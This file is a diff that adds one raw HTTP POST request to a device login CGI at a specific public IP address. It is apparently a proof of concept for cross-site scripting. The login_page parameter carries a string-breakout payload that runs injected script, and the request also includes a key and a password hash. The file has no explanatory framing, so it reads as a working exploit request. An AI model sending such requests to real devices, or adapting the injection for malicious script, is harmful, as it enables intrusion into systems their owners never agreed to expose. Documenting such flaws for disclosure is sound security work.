@@ -1,0 +1,15 @@
+POST /cgi-bin/login.cgi HTTP/1.1
+Host: 59.148.80.138
+Content-Length: 258
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+Origin: http://59.148.80.138
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://59.148.80.138/login.shtml
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=x");alert(9);x=("&homepage=main.shtml&sysinitpage=sysinit.shtml&wizardpage=wiz.shtml&hostname=59.148.80.138&key=M87060369&password=97ee8bf1a5c504594a8d5ab1dc7ce3da&lang_select=en
